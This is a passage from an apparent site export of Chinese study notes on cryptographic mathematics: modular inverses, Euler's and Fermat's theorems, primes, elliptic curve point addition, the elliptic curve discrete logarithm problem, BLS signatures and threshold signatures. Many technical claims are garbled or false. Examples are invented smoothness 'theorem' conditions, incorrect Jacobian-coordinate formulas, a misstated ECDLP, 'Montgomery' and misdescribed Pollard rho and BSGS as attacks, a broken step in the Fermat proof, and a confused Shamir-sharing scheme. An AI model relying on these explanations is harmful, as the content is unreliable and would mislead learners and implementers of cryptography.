n)，b≡c(mod n)，那么a≡c(mod n)。\n对称性：如果a≡b(mod n)，那么b≡a(mod n)。\n反身性：对于任何整数a和正整数n，a≡a(mod n)。\n同加法的分配律和结合律等类似。\n\n模运算的这些性质很重要，可以使我们在解题和证明过程中简化运算和推导，提高工作效率。\n模运算的逆元\n模运算的逆元指的是模n下的一个数b，与a模n之后的余数乘积等于1，即(a * b) ≡ 1 (mod n)。那么我们就称b为a的模n逆元。如果不存在a的逆元，那么a就没有模n下的乘法逆元。\n我们可以看一个例子来理解模运算的逆元：\n假设n=7，我们要求5在模7下的逆元b，也就是找到一个整数b，使得5*b ≡ 1 (mod 7)。\n根据模运算的定义，我们可以得到：5*b ≡ 1 (mod 7) 等价于 5b = 7k + 1。\n我们现在来尝试找到这样的b值。我们可以用暴力枚举的方法，从0开始尝试每个整数，如果找到了一个数，满足上面的等式，那么它就是5在模7下的逆元。根据上面的式子，我们可以列出下面的表格：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nb5*b7*k7*k+100011507210715315142242021295252836\n从表中可以看出，当b=3时，满足等式5b = 7k + 1。也就是说，5在模7下的逆元为3。因为5*3=15=2*7+1，5和3的乘积模7之后余数为1，满足逆元定义。\n如果我们不使用暴力枚举的方法，而是使用扩展欧几里得算法，则可以更加高效地求出模的逆元。\n模运算的应用\n密码学中的应用\n模运算在密码学中的应用非常广泛。下面以RSA加密算法为例，简单地介绍一下模运算在密码学中的应用。\nRSA加密算法是一种基于公钥密码学的加密算法，其核心原理是基于质因数分解难题，使用大素数和模运算实现加密和解密。\n在RSA算法中，我们需要选择两个大的质数p和q，然后计算n=pq，再根据欧拉函数计算φ(n)=(p-1)(q-1)，然后从φ(n)的值中选择一个与之互质的整数e，作为加密密钥。最后，我们根据e和φ(n)的值，使用模运算计算d，作为解密密钥。\n具体来说，如果我们已知e和φ(n)的值，我们可以使用扩展欧几里得算法求得e在模φ(n)下的逆元d，即d * e ≡ 1 (mod φ(n))。RSA中，e称为加密指数，n称为模数，d称为解密指数。当我们需要进行加密时，我们将明文m进行加密，得到密文c，其计算公式为：\nc ≡ m^e (mod n)\n当我们需要进行解密时，我们将密文c进行解密，得到明文m，其计算公式为：\nm ≡ c^d (mod n)\n可以看出，RSA算法中的加密和解密过程都是基于模运算实现的。因为计算n、φ(n)和d的过程都基于大素数的运算，故而RSA算法是一种非常安全的加密算法，至今仍被广泛应用于信息安全领域。\n计算机科学中的应用\n在计算机科学中，模运算也被广泛应用，如校验码算法、哈希算法、错误校正码等等，都是基于模运算实现的。\n下面以校验码算法为例，简单地介绍一下模运算在计算机科学中的应用。\n校验码算法是一种在数据传输过程中，检查数据是否出现错误的方法。我们在计算机中传输数据时，往往需要进行错误校验和纠正。而校验码算法就是用来检验和纠正错误的。\n在校验码算法中，我们经常使用模10的校验码。模10校验码的计算方法就是将每个数字加权相加后，取其个位数，就是模10的校验码。例如，对于一个包含7位数字的数据串”1234567”，我们可以通过下面的计算方法，计算出其校验码：\n\n把数字从右侧开始标号为1、2、3……，直到最左边的数字，得到编号n；\n对于每个数字，将其与数字的位置对应，乘以对应的权值，将它们相加；\n取该加权后的总和的个位数，得到模10校验码。\n\n具体来说，对于字符串”1234567”，我们可以将其从右至左进行编号，得到下面的表格：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n数字7654321编号1234567权值8765432数字 * 权值1412108642\n然后，将乘积相加，得到56，最后再取个位数6，即为模10的校验码。\n由于模10校验码的计算过程中，涉及到模运算等重要数学概念，因此计算机科学中的许多算法和技术都会涉及到模运算的应用。\n总结\n模运算是一种非常重要的数学运算，它能够广泛应用于密码学、计算机科学、物理学等领域"},"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/数论基础/数论_欧拉定理":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/数论基础/数论_欧拉定理","filePath":"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/数论基础/数论_欧拉定理.md","title":"数论_欧拉定理","links":[],"tags":[],"content":"欧拉定理（Euler’s Theorem）是数论中的一个重要定理，由瑞士数学家莱昂哈德·欧拉（Leonhard Euler）提出。欧拉定理是费马小定理的推广，涉及到模运算和欧拉函数。以下是欧拉定理的陈述、证明和应用的详细解释：\n欧拉定理的陈述\n对于任意整数a和正整数m，如果a和m互质（即它们的最大公约数为1），那么满足以下关系\na^φ(m) ≡ 1 (mod m)\n\n其中，φ(m)表示m的欧拉函数值，即小于m且与m互质的正整数的个数。\n欧拉定理的证明\n欧拉定理的证明可以基于乘法群和欧拉函数的性质。以下是证明过程：\n假设我们有一个模m下的乘法群G，包含所有与m互质的正整数。根据欧拉函数的定义，G中有φ(m)个元素。我们可以将G中的元素表示为{x1, x2, ..., xφ(m)}。\n现在考虑将乘法群G中的每个元素都乘以a，得到一个新的集合{ax1, ax2, ..., axφ(m)}。由于a和m互质，新集合中的元素在模m下两两不同余。\n类似于费马小定理的证明过程，我们可以得出新集合与原始乘法群在模m下是相同的，只是元素的顺序发生了变化。因此，两个集合的乘积在模m下是相等的：\nx1 * x2 * ... * xφ(m) ≡ a * x1 * a * x2 * ... * a * xφ(m) (mod m)\n\n将等式两边都除以原始乘法群的乘积，我们得到：\na^φ(m) * x1 * x2 * ... * xφ(m) ≡ x1 * x2 * ... * xφ(m) (mod m)\n\n由于x1, x2, ..., xφ(m)都与m互质，它们在模m下都有乘法逆元。我们可以将等式两边分别乘以x1, x2, ..., xφ(m)的乘法逆元，得到：\na^φ(m) ≡ 1 (mod m)\n\n欧拉定理的应用\n欧拉定理在数论、密码学和计算机科学等领域具有广泛的应用，以下是一些主要应用：\n\n计算模运算的逆元：欧拉定理可以用来计算模运算的逆元。对于一个与正整数m互质的整数a，它在模m下的逆元为a^(φ(m)-1)。这是因为根据欧拉定理，我们有a^φ(m) ≡ 1 (mod m)。将等式两边都除以a，我们得到a^(φ(m)-1) ≡ a^(-1) (mod m)。\n同余方程：欧拉定理可以用于解决同余方程问题，特别是模运算的指数同余方程。通过将同余方程与欧拉定理结合，我们可以将问题转化为求解模m下的逆元或对欧拉函数φ(m)取模。\n加密算法：欧拉定理在加密算法中发挥着关键作用，如RSA加密算法和ElGamal加密算法等。这些算法的安全性基于模运算的性质以及欧拉定理。\n编程竞赛和算法：在编程竞赛和算法设计中，欧拉定理常用于解决涉及模运算和指数运算的问题。通过应用欧拉定理，我们可以在许多情况下优化算法，提高计算速度。\n"},"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/数论基础/数论_素数与素数分布":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/数论基础/数论_素数与素数分布","filePath":"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/数论基础/数论_素数与素数分布.md","title":"数论_素数与素数分布","links":[],"tags":[],"content":"素数（Prime Numbers）\n素数是指大于1的自然数，其仅有两个因数：1和它本身。换句话说，一个素数不能被任何其他数（除了1和它本身）整除。\n例如，前几个素数是：\n2, 3, 5, 7, 11, 13, 17, 19, 23, 29, ...\n\n注意，1不是素数，因为它只有一个因数（即1本身）。\n素数的性质\n素数具有许多有趣的性质，以下是一些主要的性质：\n\n无穷性：素数的数量是无限的。这一事实最早由古希腊数学家欧几里得证明。\n最小素数：2是最小的素数，也是唯一的偶数素数。所有其他偶数都可以被2整除，因此它们不是素数。\n孪生素数：孪生素数是一对素数，它们之间的差为2（例如，(3, 5)、(11, 13)和(17, 19)）。孪生素数猜想是一个著名的未解问题，它猜测存在无穷多对孪生素数。\n素数分布：素数在整数中的分布遵循某种规律，但这个规律并不明显。素数定理给出了素数分布的一个近似表达式。\n素数的算术：根据算术基本定理，任何大于1的自然数都可以唯一地分解为素数的乘积。这意味着素数是整数的“基本组成单位”。\n\n素数测试\n确定一个给定的数是否为素数是许多数学和计算问题的基础。以下是一些素数测试方法：\n\n\n试除法：对给定数n，从2到√n进行遍历，如果在这个范围内没有找到整除n的数，则n为素数。\n\n\n费马小定理：如果对于正整数a和素数p，满足a^(p-1) ≡ 1 (mod p)，那么p可能是素数。费马测试并不是绝对准确的，存在一些“伪素数”能通过测试但实际上不是素数。\n\n\n米勒-拉宾素性测试：米勒-拉宾测试是一种概率性素数测试，通过一定次数的随机测试来判断一个数是否为素数。它可以在短时间内找出大概率为素数的数，但它仍然存在一定的错误率。\n\n\nAKS素性测试：AKS素性测试是一种确定性素性测试，提供了一个多项式时间的素数判断算法。与米勒-拉宾测试和费马测试不同，AKS素性测试可以在有限时间内准确判断一个数是否为素数。然而，实际应用中，AKS测试的速度较慢，通常不用于大数的素性测试。\n\n\n素数在现实应用中的重要性\n素数在现代密码学和计算领域具有广泛的应用。以下是一些著名的应用：\n\nRSA加密：RSA加密算法是一种非对称加密算法，它依赖于两个大素数的乘积作为加密密钥。由于大素数的乘积很难被因数分解，因此RSA算法在合适的参数下具有很高的安全性。\n随机数生成：素数在某些伪随机数生成器（如线性同余生成器）中起着关键作用，可以提高生成的随机数序列的质量和安全性。\n编码理论：素数在编码理论中也有重要应用，如循环冗余校验（CRC）和循环码等。\n\n总之，素数在数学、计算机科学和现实生活中具有许多有趣的性质和广泛的应用。数学家和研究人员仍在努力发现素数的更多规律和应用，以推动科学和技术的进步。"},"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/数论基础/数论_费马小定理":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/数论基础/数论_费马小定理","filePath":"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/数论基础/数论_费马小定理.md","title":"数论_费马小定理","links":[],"tags":[],"content":"费马小定理（Fermat’s Little Theorem）是数论中的一个重要定理，由法国数学家皮埃尔·德·费马（Pierre de Fermat）于17世纪提出。以下是费马小定理的陈述、证明和应用的详细解释：\n费马小定理的陈述\n对于任意整数a和素数p，如果a和p互质（即它们的最大公约数为1），那么满足以下关系：\na^(p-1) ≡ 1 (mod p)\n\n换句话说，a的p-1次方减去1后，结果可以被素数p整除。\n费马小定理的证明\n费马小定理的证明有多种方法，这里我们介绍一种基于乘法群的证明方法：\n假设我们有一个模p下的乘法群，其中的元素为{1, 2, ..., p-1}。根据费马小定理的条件，整数a和素数p是互质的，所以a在模p下存在乘法逆元。我们将乘法群中的每个元素都乘以a，得到一个新的集合{a, 2a, ..., (p-1)a}。\n注意，新集合中的元素在模p下两两不同余，因为如果存在两个不同的元素x和y使得ax ≡ ay (mod p)，则a(x-y) ≡ 0 (mod p)。由于a和p互质，我们可以得出x ≡ y (mod p)，这与x和y不同矛盾。\n由于新集合与原始乘法群中的元素个数相同且在模p下两两不同余，那么新集合与原始乘法群实际上是相同的，只是元素的顺序发生了变化。因此，两个集合的乘积在模p下是相等的：\n1 * 2 * ... * (p-1) ≡ a * (2a) * ... * ((p-1)a) (mod p)\n\n我们可以在等式两边同时除以原始乘法群的乘积，得到：\na^(p-1) * (2^(p-1)) * ... * ((p-1)^(p-1)) ≡ 1 * 2 * ... * (p-1) (mod p)\n\n由于2, 3, ..., p-1都与p互质，它们在模p下都有乘法逆元。我们可以将等式两边分别乘以2, 3, ..., p-1的乘法逆元，得到：\na^(p-1) ≡ 1 (mod p)\n\n费马小定理应用\n费马小定理在数论、密码学和计算机科学等领域具有广泛的应用，以下是一些主要应用：\n\n素性测试：费马小定理是一种素性测试方法。对于一个大整数n，如果我们找到一个整数a满足费马小定理（即a^(n-1) ≡ 1 (mod n)），那么n可能是素数。然而，这种方法并非完全准确，因为存在一些合数（被称为费马伪素数）也满足费马小定理。因此，费马小定理常与其他素性测试方法结合使用，如米勒-拉宾测试。\n模运算的逆元：费马小定理可以用来计算模运算的逆元。对于一个与素数p互质的整数a，它在模p下的逆元为a^(p-2)。这是因为根据费马小定理，我们有a^(p-1) ≡ 1 (mod p)。将等式两边都除以a，我们得到a^(p-2) ≡ a^(-1) (mod p)。\n加密算法：费马小定理在加密算法中发挥着关键作用，如RSA加密算法和ElGamal加密算法等。这些算法的安全性基于模运算的性质以及费马小定理。\n编程竞赛和算法：在编程竞赛和算法设计中，费马小定理常用于解决涉及素数和模运算的问题。通过应用费马小定理，我们可以在许多情况下优化算法，提高计算速度。\n"},"blockchainguide/Public_Chain_Development/Cryptography/椭圆曲线/椭圆曲线_定义及点加运算":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/椭圆曲线/椭圆曲线_定义及点加运算","filePath":"blockchainguide/Public_Chain_Development/Cryptography/椭圆曲线/椭圆曲线_定义及点加运算.md","title":"椭圆曲线_定义及点加运算","links":[],"tags":[],"content":"椭圆曲线的数学定义\n椭圆曲线是一个在平面上的曲线，定义为所有满足以下方程的点(x, y)所组成的集合：\ny^2 = x^3 + ax + b\n其中a, b为常数，同时这个方程必须满足 威尔斯定理：\n\n这个曲线必须是光滑的，也就是说，不允许出现尖点或者被角。\n这个曲线必须是非奇异的，也就是不存在重复的点。\n所有曲线上的点必须在一条直线上有限的集合，即曲线不能无限延伸。\n\n椭圆曲线的定义中，我们要特别注意的是参数 a 和 b，它们决定了曲线的形态。需要注意的是，一旦确定了 a 和 b 的取值，这个椭圆曲线就完全固定了下来。\n椭圆曲线上的点加法运算\n在椭圆曲线上有两种运算：点加（point addition）和标量乘法（scalar multiplication）。我们首先来介绍点加运算。\n假设有两个点 P 和 Q, P = (x1, y1), Q = (x2, y2)， 为了求出它们的和 P + Q，我们需要通过一条直线求出它们的交点 R。关于如何通过两个点来求出一条直线，我们可以使用中点公式：\nx = (\\frac{y_2 - y_1}{x_2 - x_1})^2 - x_1 - x_2\ny = (\\frac{y_2 - y_1}{x_2 - x_1})(x - x_1) - y_1\n当点 P 和 Q 相同时，我们需要使用切线来求出它们的和。\n当椭圆曲线上的点比较多时，点加运算会相对麻烦，而且存在基于中心点的不对称问题。因此，我们可以通过使用雅可比坐标系来解决这个问题，使用雅可比坐标系可以将点加速为常数时间。\n在雅可比坐标系下，我们定义一个点 (x,y,z) 表示为 (x/z^2，y/z^3)。 对于一个椭圆曲线上的点 P1 和 P2，我们通过以下公式来计算它们的和：\ns = \\frac{(y2 - y1)z1 - (y2 - y1)z2}{(x2 - x1)z1^2 - (x2 - x1)z2^2}\nx3 = s^2 - x1 - x2\ny3 = s*x3 + y1 + s(x3 - x1)\nz3 = z1 * z2 * (x1 - x2)^3\n这就是在雅可比坐标系下，计算椭圆曲线上两个点的加法。\n示例\n以下是一个简单的双曲线椭圆曲线的图示，箭头表示点加运算。两个点 P 和 Q 的和为 R。\n\n结论\n椭圆曲线是许多密码学算法的基础，例如椭圆曲线密钥交换（ECDH）和数字签名算法（ECDSA）。了解如何在椭圆曲线上进行点加运算是深入学习这些算法的基础。"},"blockchainguide/Public_Chain_Development/Cryptography/椭圆曲线/椭圆曲线_离散对数问题":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/椭圆曲线/椭圆曲线_离散对数问题","filePath":"blockchainguide/Public_Chain_Development/Cryptography/椭圆曲线/椭圆曲线_离散对数问题.md","title":"椭圆曲线_离散对数问题","links":[],"tags":[],"content":"离散对数问题的概述\n离散对数问题是密码学中非常重要的一个话题，其解决方案至今还未找到多项式时间的算法。离散对数问题的一般形式是：已知a, b, p，求x，满足a^x\\bmod p = b，其中p是一个大素数。经典的求解算法是暴力枚举法，时间复杂度是O(\\sqrt{p})，当p非常大的情况下，求解就很困难。\n椭圆曲线加密（Elliptic Curve Cryptography，ECC）是公钥密码学中非常重要的一种加密算法，其利用椭圆曲线上的运算特征解决了离散对数问题。在椭圆曲线加密中，离散对数问题发生了微小的变化，其形式为：已知P, Q, n，求x，使得P+nP=xQ，其中P和Q是椭圆曲线上的点，nP是P点加n-1个P点的和。\n在本文中，我们将介绍离散对数问题在椭圆曲线上的变种，并探究为什么它比其他场景下更难解决。\n椭圆曲线离散对数问题的定义\n在椭圆曲线加密中，点加法被定义为：对于两个点P_1=(x_1,y_1)和P_2=(x_2,y_2)，他们的和P_3=P_1+P_2定义为：\nP_3 = (x_3,y_3)\nx_3 = m^2 - x_1 - x_2\ny_3 = m(x_1 - x_3) - y_1\n其中m可以表示为：\n\\begin{cases}\n\\frac{3x_1^2+a}{2y_1}, &amp; P_1=P_2 \\\\\n\\frac{y_2-y_1}{x_2-x_1}, &amp; P_1 \\neq P_2 \\\\\n\\end{cases}$$\n\n离散对数问题在椭圆曲线上的形式为：已知一个$P$点和一个$m$值，求$x$，使得$xP=x(mP)$。\n\n在椭圆曲线变种的离散对数问题中，点加法包含了椭圆曲线的特定属性，即椭圆曲线上的点数量是有限的。因此，这种问题在椭圆曲线上更难解决。\n\n## 椭圆曲线上离散对数问题的困难性\n\n椭圆曲线上的离散对数问题比其他场景（如大质数分解问题）更难解决，原因有以下三点：\n\n1. 点加法的渐进复杂度\n\n在椭圆曲线加密中，点加法的渐进复杂度比大质数分解的复杂度低得多。在椭圆曲线上，我们可以只需要对两个点进行三次平方操作，两次乘法操作和一次减法操作即可求得加和。而大质数分解问题需要使用大的素数进行模运算（模意义下的幂运算），时间复杂度比点加法高得多。\n\n2. 有限的点数量\n\n椭圆曲线上的点数量是有限的，这就保证了攻击者只能枚举有限的数量。相比之下，大质数分解问题没有这样的限制，因为重新选取素数可以使攻击者不断扩大破解区间。\n\n3. 线性组合的困难度\n\n在椭圆曲线加密中，需要破解的是一个线性组合问题而不是离散对数问题。直接计算线性组合是很困难的，这是由于线性组合存在巨大的复杂度空间，有效的攻击方法只能使用蒙哥马利算法等一些特殊方法。\n\n缺乏有效的攻击方法，使得椭圆曲线加密成为一种非常强大的公钥密码学方案。\n\n## 椭圆曲线离散对数问题的求解方法\n\n在椭圆曲线加密中，常用的离散对数问题求解方法如下：\n\n1. 蒙哥马利算法\n\n蒙哥马利算法是一种速度较快的离散对数问题的求解方法，相较于其他方法，该算法是基于长整数乘法运算的。该方法的破解方式是通过一个特别设计的加法和乘法来对椭圆曲线进行实现。\n\n2. Pollard rho算法\n\nPollard rho算法是离散对数问题的一种启发式随机算法，该算法的时间复杂度是$O(\\sqrt{p})$，相比于传统的枚举算法要快得多。但是，在椭圆曲线上，由于点数量的限制，该算法不太适用。\n\n3. BSGS算法\n\nBSGS算法是求解离散对数问题的常见算法之一。该算法是基于Baby-Step、Giant-Step方法来实现的，其时间复杂度为$O(\\sqrt{n})$，其中$n$为$p$的位数。\n\n## 结论\n\n椭圆曲线上的离散对数问题是公钥密码学中非常重要的问题。相较于其他场景，它更难解决，这是由于点加法的复杂度相对较低、椭圆曲线上点的数量有限和线性组合的困难度高。针对该问题，人们发展了一系列的求解方法，其中最为常用的包括了蒙哥马利算法、Pollard rho算法和BSGS算法等。\n\n椭圆曲线加密是一种非常强大的公钥密码学方案，它可以在数据传输中保障数据的机密性和安全性。相比于其他加密算法，椭圆曲线加密更加安全可靠，因此在实际应用中得到了广泛的应用。"},"blockchainguide/Public_Chain_Development/Cryptography/椭圆曲线/椭圆曲线学习路线":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/椭圆曲线/椭圆曲线学习路线","filePath":"blockchainguide/Public_Chain_Development/Cryptography/椭圆曲线/椭圆曲线学习路线.md","title":"椭圆曲线学习路线","links":[],"tags":[],"content":"\n :\n\n椭圆曲线密码学（ECC）是现代密码学中的重要领域，广泛应用于加密、签名和密钥交换等场景。要深入学习椭圆曲线密码学，您需要学习多个方面的知识，包括数学、密码学原理和实际应用。以下是一个学习路径，帮助您系统地掌握椭圆曲线密码学：\n\n数论基础：数论是密码学的基础，特别是椭圆曲线密码学。学习模运算、同余、费马小定理、欧拉定理等基本数论概念。\n代数基础：学习有限域、群、环、域等代数结构，了解它们在密码学中的作用。\n椭圆曲线基础：学习椭圆曲线的数学定义、椭圆曲线上的点加法运算、椭圆曲线的性质和分类（如Weierstrass曲线、Edwards曲线等）。\n椭圆曲线上的离散对数问题：了解离散对数问题在椭圆曲线上的变种，以及为什么它在椭圆曲线上比在其他场景下更难解决。\n椭圆曲线密码学基本原理：学习椭圆曲线密码学中的基本原理和算法，如椭圆曲线 Diffie-Hellman（ECDH）密钥交换、椭圆曲线数字签名算法（ECDSA）等。\n椭圆曲线密码学的实现与优化：学习如何实现椭圆曲线密码学算法，以及针对不同场景的优化技巧，如点压缩、快速加法算法等。\n安全性和攻击：了解椭圆曲线密码学中的潜在安全隐患和攻击手段，如侧信道攻击、时序攻击等，以及如何防范这些攻击。\n椭圆曲线选择与标准：了解如何选择合适的椭圆曲线参数，以及相关的标准和推荐曲线（如NIST推荐曲线、Curve25519等）。\n后量子密码学与椭圆曲线密码学：了解量子计算对椭圆曲线密码学的潜在威胁，以及密码学界为抵抗量子攻击而提出的替代方案\n"},"blockchainguide/Public_Chain_Development/Cryptography/签名/bls签名":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/签名/bls签名","filePath":"blockchainguide/Public_Chain_Development/Cryptography/签名/bls签名.md","title":"bls签名","links":[],"tags":[],"content":"BLS签名是一种新兴的数字签名机制，它的快速性和高效性使得它在密码学领域中备受关注。BLS签名采用的是椭圆曲线上的群运算，具有优异的性能，其安全程度也得到了大规模的证明。下面我们将详细介绍BLS签名的原理、安全性、应用等方面内容。\n1. BLS签名原理\n1.1 椭圆曲线密码学（ECC）\n椭圆曲线加密系统通过椭圆曲线上的离散对数问题来构建公钥密码系统，可以提供与RSA类似的保密性、非否认性和完整性。相比于RSA，ECC算法具有更小的密钥尺寸和更快的速度，并且在某些情况下可以提供更高的安全性。\n1.2 群论\n在密码学中，群论是一种抽象的代数结构，可用于描述各种数学对象的对称性。群包含一个集合和一个二元运算符“乘法”，并满足以下四个条件：封闭性、结合律、恒等元素和逆元素。一个群被称为Abelian群，如果它的运算符是可交换的。\n1.3 BLS签名机制\nBLS签名机制的核心思想是利用椭圆曲线上的双线性对构建签名方案。这里我们简单介绍一下相关的数学符号和术语：\n\nG：表示椭圆曲线上的固定生成点。\nn：表示G的阶，即一个满足nG=0的整数n。\n群运算：加法运算以及标量乘法运算（即kP=P+P+…+P，其中k为整数）。\n双线性对：一个映射e:G×G→GT，满足以下性质：\n\n双线性性：对于任意的x,y∈Zn*和P,Q∈G，有e(xP,yQ)=e(P,Q)xy。\n非退化性：存在P∈G，使得e(P,P)!=1。\n可计算性：可以在多项式时间内计算出e(P,Q)的值。\n\n\n\nBLS签名机制包含三个主要阶段：密钥生成、签名和验证。\n1.3.1 密钥生成\nBLS签名机制中的密钥由一个公钥P和一个私钥s组成，其中P=sG。私钥s为一个随机整数，通常取值范围是[1,n-1]；而公钥P是将生成点G乘以随机数s得到的点。\n1.3.2 签名\nBLS签名机制中的签名是一个单个元素，通常表示为sigma。签名者通过将消息m和私钥s结合在一起生成BLS签名。具体地，签名过程如下：\n\n将消息哈希成椭圆曲线上的点H(m)；\n计算签名sigma=sH(m)，其中s为私钥，H(m)为哈希后得到的点；\n返回签名sigma。\n\n1.3.3 验证\nBLS签名机制中的验证需要以下信息：公钥P、消息m和签名sigma。验证者通过检查是否满足以下条件来验证签名的有效性：\ne(sigma,G)=e(H(m),P)\n如果等式成立，则签名有效；否则，签名无效。\n1.4 BLS签名的优缺点\nBLS签名的主要优点包括快速性、高效性和强安全性。由于使用了椭圆曲线上的群环结构，因此可以利用已有的密码学方法进行分析，从而证明其安全性。\n此外，BLS签名的密钥尺寸相对较小，速度快，适合于资源受限的设备。\nBLS签名的缺点在于其复杂度较高，需要进行多次群运算和双线性对的计算，因此对于某些应用场景来说不太适合。\n2. BLS签名安全性分析\nBLS签名的安全性基于双线性对的离散对数难题。具体地说，如果攻击者可以有效地计算出椭圆曲线上的群元素的离散对数，则可以破解该密码学方案。但是，在目前的技术水平下，这个问题是极其困难的。\n此外，BLS签名机制还具有强保密性和非否认性。任何人都无法获取到私钥s，因此只有拥有私钥的人才能够生成有效的签名。\n3. BLS签名应用\nBLS签名机制已经在各种区块链项目中得到了广泛的应用。例如，BLS签名已经被用于Zcash、Filecoin等项目中。以Zcash为例，其匿名交易过程需要使用BLS签名来保证交易的可靠性和隐私性。\n此外，BLS签名也可以用于构建去中心化身份验证系统、多方计算等领域。相信未来BLS签名会在更多的应用场景中得到广泛应用。\n4. 总结\nBLS签名是一种新兴的数字签名机制，它采用了椭圆曲线上的群环结构和双线性对，具有快速、高效和强安全性的优点。BLS签名已经被广泛应用于区块链项目中，未来将在更多领域得到应用。"},"blockchainguide/Public_Chain_Development/Cryptography/签名/基于BLS的门限签名方案":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/签名/基于BLS的门限签名方案","filePath":"blockchainguide/Public_Chain_Development/Cryptography/签名/基于BLS的门限签名方案.md","title":"基于BLS的门限签名方案","links":[],"tags":[],"content":"需求：\n全网第一个人收集签名消息，然后剩余的99个人对第一个人进行投票，消息结构包括投票的地址，和第一个人地址，每个人都有对应的权重（比如1，2，3数字），每个人都会对自己的投票消息签名，只要第一个人收到超过51%权重（他是指签名的人质押的金额总和超过了51%的总权重，实际签名的人可以少于51%）的投票消息，就表示同意了这个消息，然后区块会记录收到的那些消息签名，使用基于BLS的门限签名方案，通过go语言实现，要有详细的中文解释\n目前一共10个节点，现在准备投票给第一个节点，每个节点的权重为1，投票的权重要超过50%，投票消息才成立，每个节点都有自己的公钥和私钥，请使用基于BLS的门限签名方案用go语言实现并中文详细注释\n对一个节点作为矿工达成共识，使用基于BLS的门限签名方案，总共10个节点，每个节点权重为1，要超过权重6的投票消息才成立，默认被投的矿工是第一个节点，每个节点都有自己的公钥和私钥，请中文详细解释代码\n门限签名是一种签名方案，用于在多方参与签名的场景下保护签名私钥的安全性。与传统的数字签名方案不同，门限签名方案需要多个参与方共同合作才能生成有效的签名，而且参与方之间可以设置不同的门限值，以控制签名的有效性。本文将详细介绍门限签名的定义、原理、优缺点以及应用场景等相关内容。\n1. 门限签名的定义\n门限签名（Threshold Signature）是一种多方参与签名的方案，它可以保证签名私钥的安全性，同时也可以控制签名的有效性。在门限签名方案中，需要设定一个门限值 t，当有 t 个或以上的参与方签名时，签名才能被视为有效。具体来说，门限签名方案包括两个阶段：\n\n签名生成阶段：由 n 个参与方共同生成一个签名私钥，该私钥被分为 n 个部分，每个部分由一个参与方持有；\n签名验证阶段：当有 t 个或以上的参与方对消息进行签名时，可以通过这些签名验证得到一个有效签名，该签名可以被任何人验证其合法性。\n\n门限签名方案可以通过加密算法和数字签名算法实现，目前主要应用于分布式系统、多方计算、区块链等领域。\n2. 门限签名的原理\n门限签名方案的原理基于 Shamir 秘密共享方案，该方案可以将一个秘密 s 分为 n 个部分，其中任意 t 个部分可以恢复出秘密 s，而任意 t-1 个部分则无法获得任何秘密信息。具体来说，Shamir 秘密共享方案包括以下步骤：\n\n选择一个大质数 p，并选取一个小于 p 的整数 s，将 s 视为秘密；\n选择 t-1 个不同的随机数 a_1,a_2,\\ldots,a_{t-1}，并令 f(x)=s+a_1x+a_2x^2+\\ldots+a_{t-1}x^{t-1}；\n\n在门限签名方案中，签名私钥也可以通过 Shamir 秘密共享方案进行分割，具体过程如下：\n\n选择一个大质数 p，并选取一个小于 p 的整数 s，将 s 视为签名私钥；\n选择 n 个不同的随机数 a_1,a_2,\\ldots,a_n，并令 f(x)=s+a_1x+a_2x^2+\\ldots+a_{t-1}x^{t-1}；\n将 f(x) 的 n 个系数 f_0,f_1,\\ldots,f_{n-1} 分别发送给 n 个参与方，每个参与方获得一个系数；\n当有 t 个或以上的参与方聚集在一起时，可以通过拉格朗日插值法计算出 f(0)，从而得到签名私钥 s。\n\n在签名阶段，假设要对消息 m 进行签名，参与方 i 选择一个随机数 r_i，并计算出 h(m,r_i)，其中 h 表示一个哈希函数。然后参与方 i 计算 g_i=h(m,r_i)^{a_i}，并将 g_i 发送给其他参与方。\n当有 t 个或以上的参与方计算出 g_i 后，他们可以通过拉格朗日插值法计算出 g=\\prod_{i\\in S}g_i，其中 S 表示这 t 个参与方的集合。然后任意一个参与方可以计算出签名 (m,\\sigma)，其中 \\sigma=(r,g)。\n在验证阶段，任何人都可以验证签名的合法性。具体来说，验证者需要知道门限值 t，以及参与方 i 的公钥 p_i=h(m,p_{i,1},p_{i,2},\\ldots,p_{i,t})，其中 p_{i,j}=h(m,r_j)^{a_{i,j}}。然后验证者计算出 g=p_1^{w_1}p_2^{w_2}\\cdots p_n^{w_n}，其中 w_i 表示参与方 i 在签名阶段中所使用的权重。如果 g=\\prod_{i\\in S}g_i，则签名有效，否则签名无效。\n3. 门限签名的优缺点\n门限签名方案相对于传统的数字签名方案具有以下优点：\n\n\n私钥安全性更高：传统的数字签名方案中，签名私钥通常由一个人独立持有，如果该人的私钥泄露，那么签名就会失去有效性。而门限签名方案中，签名私钥被分割成多个部分，只有在\n\n\n聚集了足够数量的参与方之后才能恢复出完整的签名私钥，因此私钥的安全性更高；\n\n抗单点故障：在传统的数字签名方案中，如果签名私钥的持有者出现了单点故障，那么整个签名系统都将无法正常工作。而门限签名方案中，只要有足够数量的参与方能够聚集在一起，就能够继续进行签名操作；\n抗篡改：在传统的数字签名方案中，签名私钥的持有者可能会恶意篡改签名结果，从而导致签名无效。而在门限签名方案中，只要有足够数量的参与方能够聚集在一起，就能够保证签名结果的完整性。\n\n然而，门限签名方案也存在以下缺点：\n\n需要预先确定门限值：门限签名方案需要预先确定门限值 t，并且参与方的数量必须大于 